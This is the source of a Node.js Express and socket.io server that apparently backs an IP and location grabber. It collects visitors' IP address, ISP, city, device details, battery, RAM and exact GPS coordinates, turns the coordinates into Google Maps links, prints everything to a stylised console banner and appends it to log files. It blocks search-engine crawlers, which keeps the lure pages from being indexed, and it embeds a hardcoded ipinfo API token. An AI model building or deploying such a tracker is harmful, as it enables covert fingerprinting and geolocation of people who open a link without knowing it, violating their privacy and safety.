const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const useragent = require('useragent');
const geoip = require('geoip-lite');
const figlet = require('figlet');

let chalk;
(async () => {
  chalk = (await import('chalk')).default;
})();

const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.static('Templates'));
app.use(express.json());

const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);

// Known bot IP ranges (can be expanded with more bot IP ranges)
const knownBotIPs = [
  '34.83.203.92', // Example bot IP (You can add more IPs here)
];

// ========== FIXED IP CAPTURE ==========
async function getPublicIP(req) {
  try {
    let ip = req.headers['cf-connecting-ip'] 
            || req.headers['x-real-ip']
            || req.headers['x-forwarded-for']?.split(',')[0].trim()
            || req.connection.remoteAddress;

    if (ip === '::ffff:127.0.0.1' || ip === '::1') {
      const response = await axios.get('https://api64.ipify.org?format=json');
      ip = response.data.ip;
    }
    return ip;
  } catch (error) {
    console.error("Error fetching public IP:", error);
    return "Unknown IP";
  }
}

// ========== FIXED ISP LOOKUP ==========
async function getISPDetails(ip) {
  try {
    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=8385b01b0f1e85`);
    return response.data.org || "Unknown ISP";
  } catch (error) {
    console.error("Error fetching ISP details:", error);
    return "Unknown ISP";
  }
}

// ========== BOT DETECTION ==========
function isBot(userAgent, ip) {
  // Check for common bot patterns in User-Agent
  const botUserAgents = [
    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Bot', 'crawler', 'spider'
  ];
  if (botUserAgents.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()))) {
    return true;
  }

  // Check if IP is known to be a bot IP (This can be enhanced by using IP reputation services)
  if (knownBotIPs.includes(ip)) {
    return true;
  }

  return false;
}

app.post('/capture-ip', async (req, res) => {
  const { resolution, battery, isCharging, userAgent, ram } = req.body;
  
  const ip = await getPublicIP(req);

  // Bot detection
  if (isBot(userAgent, ip)) {
    console.log(chalk.red.bold('🚫 Bot Detected! Blocking request.'));
    return res.status(400).json({ success: false, message: 'Bot detected and blocked.' });
  }

  const parser = new UAParser(userAgent);
  const uaDetails = parser.getResult();
  const geo = geoip.lookup(ip);
  const isp = await getISPDetails(ip);
  const timezone = geo?.timezone || "Unknown Timezone";
  const currentDateTime = new Date().toLocaleString("en-US", { timeZone: "GMT" });

  const details = {
    IP: ip,
    CITY: geo?.city || "Unknown",
    STATE: geo?.region || "Unknown",
    COUNTRY: geo?.country || "Unknown",
    ISP: isp,
    TIMEZONE: timezone,
    "DATE/TIME": currentDateTime,
    BROWSER: `${uaDetails.browser.name} ${uaDetails.browser.version}`,
    OS: `${uaDetails.os.name} ${uaDetails.os.version}`,
    PLATFORM: uaDetails.device.type || "Unknown",
    USERAGENT: userAgent,
    RESOLUTION: resolution || "Unknown Resolution",
    BATTERY: `${battery}% (${isCharging ? "Charging" : "Not Charging"})`,
    RAM: ram || "Unknown RAM",
    BOT: useragent.is(userAgent).isBot ? "Yes" : "No",
    FINGERPRINT: Math.random().toString(36).substring(2, 15)
  };

  if (chalk) {
    console.log(chalk.yellow(figlet.textSync('Visitor Info', { horizontalLayout: 'full' })));
    console.log(chalk.bold.yellow('🚀 VISITOR DETAILS:\n'));
    console.log(`${chalk.bold.cyan('📌 IP Address:')}           ${chalk.bold.green(details.IP)}`);
    console.log(`${chalk.bold.cyan('🏙 City:')}                  ${chalk.bold.green(details.CITY)}`);
    console.log(`${chalk.bold.cyan('🗺 State:')}                 ${chalk.bold.green(details.STATE)}`);
    console.log(`${chalk.bold.cyan('🌍 Country:')}              ${chalk.bold.green(details.COUNTRY)}`);
    console.log(`${chalk.bold.cyan('📡 ISP:')}                  ${chalk.bold.green(details.ISP)}`);
    console.log(`${chalk.bold.cyan('⏳ Timezone:')}             ${chalk.bold.green(details.TIMEZONE)}`);
    console.log(`${chalk.bold.cyan('🕒 Date & Time:')}          ${chalk.bold.green(details["DATE/TIME"])}\n`);
    console.log(chalk.bold.yellow('💻 DEVICE INFO:\n'));
    console.log(`${chalk.bold.cyan('🌐 Browser:')}                ${chalk.bold.green(details.BROWSER)}`);
    console.log(`${chalk.bold.cyan('🖥 OS:')}                      ${chalk.bold.green(details.OS)}`);
    console.log(`${chalk.bold.cyan('🖥 Screen Resolution:')}       ${chalk.bold.green(details.RESOLUTION)}`);
    console.log(`${chalk.bold.cyan('🔋 Battery:')}                ${chalk.bold.green(details.BATTERY)}`);
    console.log(`${chalk.bold.cyan('💾 RAM:')}                    ${chalk.bold.green(details.RAM)}`);
    console.log(`${chalk.bold.cyan('🤖 Bot Status:')}             ${chalk.bold.green(details.BOT)}`);
  }

  fs.appendFileSync(path.join(logDir, 'visitor.log'), JSON.stringify(details, null, 2) + "\n");
  res.json({ success: true, details });
});

app.post('/location', (req, res) => {
  const { latitude, longitude } = req.body;
  const mapLink = `https://www.google.com/maps/place/${latitude},${longitude}`;

  if (chalk) {
    console.log(chalk.red.bold('\n📍 LOCATION INFO:'));
    console.log(`${chalk.bold.yellow('📍 Latitude:')}           ${chalk.bold.green(latitude)}`);
    console.log(`${chalk.bold.yellow('📍 Longitude:')}          ${chalk.bold.green(longitude)}`);
    console.log(`${chalk.bold.yellow('🌍 Map Link:')}           ${chalk.bold.green(mapLink)}`);
  }

  fs.appendFileSync(path.join(logDir, 'location.log'), `Location: ${mapLink}\n`);
  res.json({ success: true, message: 'Location received successfully.' });
});

io.on('connection', (socket) => {
  if (chalk) console.log(chalk.cyan.bold('\n🌐 New Client Connected'));

  socket.on('location', (coords) => {
    const mapLink = `https://www.google.com/maps/place/${coords.latitude},${coords.longitude}`;
    if (chalk) {
      console.log(chalk.red.bold('\n📍 LOCATION RECEIVED:'));
      console.log(`${chalk.bold.yellow('📍 Latitude:')}  ${chalk.bold.green(coords.latitude)}`);
      console.log(`${chalk.bold.yellow('📍 Longitude:')} ${chalk.bold.green(coords.longitude)}`);
      console.log(`${chalk.bold.yellow('🌍 Map Link:')}  ${chalk.bold.green(mapLink)}`);
    }
    fs.appendFileSync(path.join(logDir, 'location.log'), `Location: ${mapLink}\n`);
    socket.emit('locationReceived', 'Location data received successfully.');
  });

  socket.on('disconnect', () => {
    if (chalk) console.log(chalk.red.bold('\n❌ Client Disconnected'));
  });
});

const PORT = process.env.PORT || 8080; 
server.listen(PORT, '0.0.0.0', () => {
  if (chalk) console.log(chalk.green.bold(`\n✅ Server running on http://0.0.0.0:${PORT}`));
});
